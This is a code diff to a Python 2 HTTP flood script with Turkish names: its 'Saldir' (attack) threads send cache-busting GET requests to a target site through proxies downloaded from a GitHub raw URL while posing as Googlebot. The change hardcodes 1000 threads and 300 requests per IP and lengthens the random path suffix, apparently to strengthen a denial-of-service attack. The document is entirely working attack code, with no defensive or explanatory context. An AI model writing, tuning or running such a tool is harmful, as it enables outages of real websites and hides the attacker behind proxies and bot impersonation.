@@ -24,7 +24,7 @@ class Saldir(threading.Thread):
             proxy = ProxyListesi[current].split(':')
         else:
             proxy = random.choice(ProxyListesi).split(':')
-        Tarayici = "GET " + SiteLink + random_str_2(8) +" HTTP/1.1\r\n"\
+        Tarayici = "GET " + SiteLink + random_str_2(10) +" HTTP/1.1\r\n"\
 		"Host: " + HostLink + "\r\n"\
 		"Accept-Encoding: deflate,br\r\n"\
 		"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n"\
@@ -54,8 +54,8 @@ HostLink = SiteLink.split('/')[2]
 Dosya  = urllib2.urlopen('https://raw.githubusercontent.com/webr00t/web/master/p.txt')
 ProxyCek = Dosya.read()
 ProxyListesi = ProxyCek.split('\n')
-thread = int(sys.argv[2])
-ipbasi = int(sys.argv[3])
+thread = 1000
+ipbasi = 300
 nload = 1
 x = 0
 for x in xrange(thread):
